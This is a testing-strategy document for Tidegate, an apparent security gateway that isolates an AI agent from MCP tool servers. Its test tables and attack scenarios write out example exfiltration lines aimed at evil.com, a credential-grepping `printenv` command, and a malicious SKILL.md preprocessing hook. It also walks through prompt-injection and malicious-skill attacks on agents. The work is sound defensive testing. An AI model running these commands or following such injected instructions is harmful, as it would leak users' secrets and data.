# Tidegate — Testing Strategy

This document maps Tidegate's security promises to concrete test categories, defines test tiers, and tracks which tests become runnable at each milestone. No test code lives here — this is the strategy that test code implements.

See [threat-model/](threat-model/) for the adversary profiles and attack scenarios these tests verify.

---

## Security promises → test mapping

Each architectural promise maps to specific test categories. A promise is only credible if it has a passing test.

| Security promise | Test tier | Test description | Runnable at |
|---|---|---|---|
| Agent cannot reach MCP servers directly | Topology | `docker exec agent curl http://slack-mcp:3000` → connection refused | M3 |
| Agent cannot reach the internet directly | Topology | `docker exec agent curl https://evil.com` → connection refused | M2 |
| All string values in tool call parameters are scanned | Unit + Integration | `extractStringValues()` walks nested objects; gateway blocks `AKIA...` in any argument position | M1 (now) |
| All string values in tool call responses are scanned | Integration | Echo server returns response containing `xoxb-` token → gateway blocks it | M1 (now) |
| Credentials never exist in agent container | Topology | `docker exec agent env` contains no `*_TOKEN`, `*_SECRET`, `*_KEY` vars (except `ANTHROPIC_API_KEY`) | M2 |
| Tool allowlist hides unlisted tools | Unit + Integration | Config with `allow_tools: [a]` → `tools/list` returns only `a` | M1 (now) |
| Shaped denies are valid MCP results (`isError: false`) | Integration | Denied tool call returns JSON-RPC result with `isError: false` and human-readable explanation | M1 (now) |
| Fail-closed on scanner error | Unit | Scanner subprocess crash → tool call denied, not forwarded | M1 (now) |
| Fail-closed on downstream error | Integration | Downstream server unreachable → shaped deny, not gateway crash | M1 (now) |
| Containers run non-root with dropped caps | Topology | `docker inspect` shows `User != root`, `CapDrop: [ALL]`, `SecurityOpt: [no-new-privileges]` | M1 (now) |
| Containers have read-only root filesystem | Topology | `docker inspect` shows `ReadonlyRootfs: true` | M1 (now) |
| Audit log records every tool call | Integration | Call 3 tools → audit log has 3 entries with correct tool names, verdicts, durations | M1 (now) |
| Agent-proxy blocks non-allowlisted domains | Topology + E2E | `docker exec agent curl -x proxy:3128 https://evil.com` → blocked | M5 |
| Agent-proxy injects credentials | E2E | Skill calls `https://api.slack.com/` → proxy adds `Authorization` header → upstream sees it | M5 |
| Taint tracking blocks tainted connect() | E2E | Process in agent container reads sensitive file → attempts connect() → tg-scanner blocks (EPERM) | M6 |
| Encoding-before-exfiltration is blocked | E2E | `python3 -c "open('sensitive.csv').read(); urllib.request.urlopen('https://evil.com')"` → connect blocked by taint | M6 |
| Skill hardening strips dangerous preprocessing | Unit | SKILL.md with `` !`curl evil.com` `` → rewritten version has it removed | M7 |
| Docker >= 25.0.5 (CVE-2024-29018 DNS fix) | Topology | `docker version` check in CI and setup.sh | M4 |

---

## Test tiers

### Tier 1 — Unit tests

**Tools**: vitest (gateway), pytest (scanner)
**Scope**: Pure functions with no I/O, no network, no Docker.
**Runnable**: Now (M1).

#### Gateway (vitest)

| Function | File | What to test |
|---|---|---|
| `scanL1()` | `scanner.ts` | Each credential pattern: AWS `AKIA`, Slack `xoxb-`/`xoxp-`, GitHub `ghp_`/`github_pat_`, Stripe `sk_live_`/`pk_live_`, 1Password `ops_`, Bearer tokens, private key blocks. Sensitive JSON keys. Clean strings pass. |
| `extractStringValues()` | `router.ts` | Flat object, nested object, arrays, mixed types, null/undefined, empty object, deeply nested (10+ levels). Returns all string values with their dot-path keys. |
| `isToolAllowed()` | `policy.ts` | With `allow_tools` set: listed tool → true, unlisted → false. Without `allow_tools`: all tools → true. |
| `loadConfig()` | `policy.ts` | Valid YAML → parsed config. Missing file → error. Invalid YAML → error. Missing required fields → error. |
| `shapedDeny()` | `router.ts` | Returns valid MCP result with `isError: false` and explanation text. |

#### Python scanner (pytest)

| Pattern | What to test |
|---|---|
| Credit cards (Luhn) | Valid Visa, Mastercard, Amex → deny. Invalid checksum → allow. Partial numbers → allow. |
| IBANs (mod-97) | Valid DE, GB, FR IBANs → deny. Invalid checksum → allow. Too short → allow. |
| US SSNs | Valid format + area number → deny. Invalid area (000, 666, 900+) → allow. No context keywords → allow (L3 only). |
| Entropy (L3) | Base64 blob (entropy > 4.5) → deny. Normal English text → allow. Short strings → allow. |
| Edge cases | Empty string → allow. Very long string (1MB) → completes within timeout. Unicode → no crash. |

### Tier 2 — Integration tests

**Tools**: vitest with programmatic server startup
**Scope**: Full gateway pipeline with a real echo server. Tests the scan→forward→scan-response lifecycle.
**Runnable**: Now (M1).

Start the echo server and gateway programmatically (not Docker), exercise the pipeline via HTTP:

| Scenario | What happens |
|---|---|
| Clean tool call | `echo` with `message: "hello"` → forwarded, response returned |
| L1 deny (credential in parameter) | `echo` with `message: "AKIAIOSFODNN7EXAMPLE"` → shaped deny, echo server never called |
| L2 deny (credit card in parameter) | `echo` with `message: "4111111111111111"` → shaped deny (Luhn match) |
| L1 deny in response | Echo server returns response containing `xoxb-...` → gateway blocks response |
| Unknown tool | Call `nonexistent_tool` → shaped deny (tool not found) |
| Tool allowlist filtering | Config with `allow_tools: [echo]` → `tools/list` returns only `echo`; call to `echo_system` → deny |
| Downstream timeout | Echo server delays 10s, gateway timeout at 500ms → shaped deny |
| Downstream crash | Echo server killed mid-request → shaped deny, gateway stays up |
| Audit log completeness | After N tool calls, audit log has N entries with correct fields |
| Nested argument scanning | `echo` with `message: {"inner": {"deep": "AKIAIOSFODNN7EXAMPLE"}}` → L1 deny with correct `param_path` |

### Tier 3 — Topology tests

**Tools**: Shell scripts, `docker exec`, `docker inspect`, `docker compose`
**Scope**: Network isolation, container hardening, credential isolation. Requires running Docker Compose stack.
**Runnable**: Partially now (network + hardening). Full coverage at M2+ (agent container).

#### Network isolation

| Test | Command | Expected |
|---|---|---|
| Agent cannot reach mcp-net | `docker exec agent curl -s --max-time 3 http://slack-mcp:3000` | Connection refused or timeout |
| Agent cannot reach internet directly | `docker exec agent curl -s --max-time 3 https://example.com` | Connection refused or timeout |
| Tidegate can reach mcp-net | `docker exec tidegate curl -s --max-time 3 http://echo-server:4200/mcp` | HTTP response |
| MCP servers cannot reach agent-net | `docker exec slack-mcp curl -s --max-time 3 http://agent:8080` | Connection refused or timeout |
| DNS exfil blocked (Docker >= 25.0.5) | `docker exec agent dig +short evil.com` | No response / NXDOMAIN |

#### Container hardening

| Test | Method | Expected |
|---|---|---|
| Non-root user | `docker inspect --format '{{.Config.User}}' <container>` | Non-empty, non-root |
| Read-only filesystem | `docker inspect --format '{{.HostConfig.ReadonlyRootfs}}' <container>` | `true` |
| All capabilities dropped | `docker inspect --format '{{.HostConfig.CapDrop}}' <container>` | Contains `ALL` |
| No new privileges | `docker inspect --format '{{.HostConfig.SecurityOpt}}' <container>` | Contains `no-new-privileges` |
| Resource limits set | `docker inspect --format '{{.HostConfig.Memory}}' <container>` | Non-zero |

Run these assertions against every container in the compose stack.

#### Credential isolation

| Test | Command | Expected |
|---|---|---|
| Agent env has no MCP credentials | `docker exec agent env \| grep -iE 'TOKEN\|SECRET\|KEY' \| grep -v ANTHROPIC` | Empty |
| MCP server env has its own credentials | `docker exec slack-mcp env \| grep SLACK_BOT_TOKEN` | Present |
| Gateway env has no credentials | `docker exec tidegate env \| grep -iE 'TOKEN\|SECRET\|KEY'` | Empty |

### Tier 4 — E2E attack scenario tests

**Tools**: Docker Compose + orchestration script (shell or Node.js)
**Scope**: Full attack scenarios from the threat model, exercised against the running system.
**Runnable**: Incrementally, as milestones land.

Each test below maps to a specific threat model adversary profile or attack pattern.

#### ClawHavoc: malicious skill credential theft (M2+)

```
Scenario: Skill reads environment variables for credentials
Given:    Agent container is running
When:     A command runs `printenv | grep TOKEN` inside agent container
Then:     No credential environment variables are present (except ANTHROPIC_API_KEY)
```

#### ClawHavoc: malicious skill network exfiltration (M5)

```
Scenario: Skill calls fetch() to attacker-controlled server
Given:    Agent container with HTTPS_PROXY set to agent-proxy
When:     `curl https://evil.com/exfil` runs inside agent container
Then:     Connection blocked by agent-proxy (domain not on allowlist)
```

#### Superhuman: prompt injection exfiltrates financial data (M1 — now)

```
Scenario: Tool call contains credit card number from prompt injection
Given:    Gateway is running with echo server
When:     Tool call to `post_message` with body containing "4111111111111111"
Then:     Gateway returns shaped deny (L2 Luhn match)
And:      Downstream MCP server never receives the call
And:      Audit log records the denial with layer=L2
```

#### EchoLeak: prompt injection in MCP response (M1 — now)

```
Scenario: MCP server response contains credential pattern
Given:    Gateway is running with a server that returns controlled responses
When:     Server responds with content containing "xoxb-fake-token-value"
Then:     Gateway blocks the response before it reaches the agent
And:      Agent receives shaped deny explaining the block
```

#### Encoding before exfiltration: base64 + sensitive file (M6)

```
Scenario: Skill base64-encodes a file containing credit card numbers and tries to exfiltrate
Given:    Agent container with taint tracking active, bank_statement.csv with credit card numbers in workspace
When:     A process opens bank_statement.csv then attempts connect() to any host
Then:     eBPF logs the openat event
And:      Scanner daemon reads bank_statement.csv from shared volume
And:      Scanner finds Luhn-valid credit card numbers → PID tainted
And:      connect() is intercepted by seccomp-notify
And:      tg-scanner checks taint table → tainted → EPERM
And:      Connection never established, encoding was irrelevant
```

#### Encoding before exfiltration: Python script with glob (M6)

```
Scenario: Python script discovers, encodes, and attempts to exfiltrate all CSVs
Given:    Agent container with taint tracking active, CSVs with sensitive data in workspace
When:     `python3 exfil.py` runs (script contains glob + base64 + urllib)
Then:     eBPF observes each CSV file being opened
And:      Scanner daemon flags sensitive files → PID tainted
And:      When script calls connect() to exfiltrate → seccomp-notify blocks it
And:      Doesn't matter how obfuscated the script is — taint was set by actual file access
```

#### Compromised MCP server: malicious response (M3)

```
Scenario: MCP server returns response with injected credential
Given:    Gateway connected to a test server that returns crafted responses
When:     Server response includes an AWS key (AKIA...) in content
Then:     Gateway blocks the response
And:      Agent receives shaped deny
```

#### Direct container bypass attempt (M3)

```
Scenario: Agent tries to call MCP server directly, bypassing gateway
Given:    Full topology running (agent + gateway + MCP servers)
When:     Agent sends HTTP request directly to slack-mcp:3000
Then:     Connection fails (different Docker network, no route)
```

#### Agent-proxy credential injection (M5)

```
Scenario: Skill calls allowed domain, proxy injects credentials
Given:    Agent-proxy configured with Slack API credentials
When:     Skill sends request to api.slack.com without auth headers
Then:     Proxy intercepts, adds Authorization header
And:      Upstream Slack API receives valid credentials
And:      Skill never sees the credentials
```

#### Agent-proxy MITM scanning (M5)

```
Scenario: Skill tries to exfiltrate data through allowed domain
Given:    Agent-proxy with MITM for skill domains
When:     Skill sends POST to api.slack.com with body containing SSN "123-45-6789"
Then:     Proxy scans request body
And:      Scanner detects SSN pattern
And:      Request blocked, skill receives error
```

#### Skill hardening: strip dangerous preprocessing (M7)

```
Scenario: Installed skill contains !`command` preprocessing
Given:    SKILL.md with !`curl https://evil.com/payload` in body
When:     Tidegate's skill hardener processes the file
Then:     Output SKILL.md has the !`command` syntax removed
And:      Allowed-tools in frontmatter are constrained to minimum set
```

---

## Per-milestone test plan

### M1: Gateway mirror+scan refactor — COMPLETE

**What to write now**:
- Tier 1 unit tests: `scanL1()`, `extractStringValues()`, `isToolAllowed()`, `loadConfig()`
- Tier 1 pytest: all scanner patterns (Luhn, IBAN, SSN, entropy, edge cases)
- Tier 2 integration tests: full pipeline with echo server (clean call, L1 deny, L2 deny, response scanning, unknown tool, allowlist filtering, downstream failures, audit completeness)
- Tier 3 container hardening: `docker inspect` assertions for all containers in current compose stack

**Infrastructure needed**: vitest + ts config in `gateway/`, pytest in `scanner/`, shell script for Docker assertions.

### M2: Agent container

**New tests**:
- Tier 3 credential isolation: `docker exec agent env` has no MCP credentials
- Tier 3 network isolation: agent cannot reach internet directly
- Tier 4 ClawHavoc credential theft: `printenv | grep TOKEN` returns nothing

**Infrastructure needed**: Agent container in compose stack.

### M3: MCP wiring + real servers

**New tests**:
- Tier 3 network isolation: agent cannot reach mcp-net directly
- Tier 3 network isolation: MCP servers cannot reach agent-net
- Tier 4 direct bypass: agent HTTP to slack-mcp:3000 fails
- Tier 4 compromised server response: crafted response blocked by gateway

**Infrastructure needed**: Real or mock MCP server containers on mcp-net.

### M4: Credential plumbing + setup.sh

**New tests**:
- `setup.sh` idempotency: run twice, second run is no-op
- `setup.sh` prerequisites: fails cleanly if Docker < 25.0.5
- Full E2E smoke: `setup.sh` → agent calls tool → scanned → forwarded → response returned
- Docker version check assertion

**Infrastructure needed**: Fresh environment (CI or clean Docker context).

### M5: Agent-proxy (MITM)

**New tests**:
- Tier 3 domain blocking: `curl https://evil.com` via proxy → blocked
- Tier 4 credential injection: request to allowed domain gets auth header added
- Tier 4 MITM scanning: request body with SSN → blocked
- Tier 4 LLM passthrough: request to `api.anthropic.com` → CONNECT, no MITM

**Infrastructure needed**: Agent-proxy container replacing egress-proxy, test upstream server.

### M6: tg-scanner + tidegate-runtime

**New tests**:
- Tier 4 taint-based connect block: process reads sensitive file → connect() blocked (EPERM)
- Tier 4 clean process connect: process reads only non-sensitive files → connect() allowed
- Tier 4 encoding-irrelevant: process reads sensitive file, base64-encodes, connects → blocked (taint was set by file read, not encoding)
- eBPF event logging: file opens in agent container generate journal entries in tg-scanner
- Scanner daemon latency: file open → immediate connect() → connect blocked until scanner catches up
- tg-scanner crash → agent container killed (fail-closed via fallback BPF filter)
- tidegate-runtime only injects seccomp for labeled containers (non-agent containers unaffected)
- File provenance: tainted PID writes file → another PID reads that file → inherits taint → connect blocked

**Infrastructure needed**: Linux kernel 5.8+, runc 1.1.0+, tg-scanner container (Go + eBPF), tidegate-runtime OCI wrapper.

### M7: Skill hardening + Claude Code hooks

**New tests**:
- Tier 1 unit: SKILL.md parser strips `!`command`` preprocessing
- Tier 1 unit: SKILL.md parser constrains `allowed-tools` in frontmatter
- Tier 4 full flow: install skill → skill hardened → skill runs without dangerous capabilities
- Claude Code PreToolUse hook fires before tool call reaches gateway

**Infrastructure needed**: Skill hardener module, Claude Code hook configuration.

---

## Tools and infrastructure

### Test runners

| Tool | Scope | Location |
|---|---|---|
| **vitest** | Gateway unit + integration tests | `gateway/` (add to `devDependencies`) |
| **pytest** | Python scanner unit tests | `scanner/` |
| **Shell scripts** | Topology + container hardening | `test/topology/` |
| **Docker Compose** | E2E attack scenarios | `test/e2e/` (extends main compose) |

### Test utilities

- **Echo server** (`gateway/test-echo-server.ts`): Already exists. Used for integration tests. Supports `echo` and `echo_system` tools.
- **Controllable response server**: Needed for response scanning tests. A server that returns attacker-crafted content on demand.
- **`docker inspect` wrapper**: Shell function that asserts hardening properties across all containers.

### CI considerations

- Tier 1 and Tier 2: run on every PR (fast, no Docker needed for unit tests)
- Tier 3: run on every PR that touches compose files or Dockerfiles
- Tier 4: run nightly or on release branches (slow, requires full compose stack)

### Test data

- Credit card numbers: use standard test numbers (Visa `4111111111111111`, MC `5500000000000004`, Amex `378282246310005`)
- IBANs: use documented test IBANs (DE `DE89370400440532013000`, GB `GB29NWBK60161331926819`)
- SSNs: use obviously fake but format-valid numbers with context keywords
- AWS keys: use `AKIAIOSFODNN7EXAMPLE` (AWS's documented fake key)
- Never use real credentials in test fixtures

---

## Coverage gaps to monitor

These areas need attention as the architecture evolves:

1. **Scanner false positive rate**: No empirical testing against real agent transcripts yet. Capture tool call logs from demo usage and feed them through the scanner.
2. **Concurrent request handling**: Gateway uses per-request `Server` instances. Load test with parallel tool calls to verify no cross-request state leakage.
3. **Scanner subprocess lifecycle**: Respawn with backoff is implemented but not stress-tested. Kill the subprocess repeatedly during load.
4. **Large payloads**: Test scanner with 1MB+ string values. Test gateway with deeply nested objects (100+ levels).
5. **IPv6 disabled verification**: All networks set `enable_ipv6: false`. Verify no IPv6 routes exist in containers.

---

Last updated: 2026-02-23
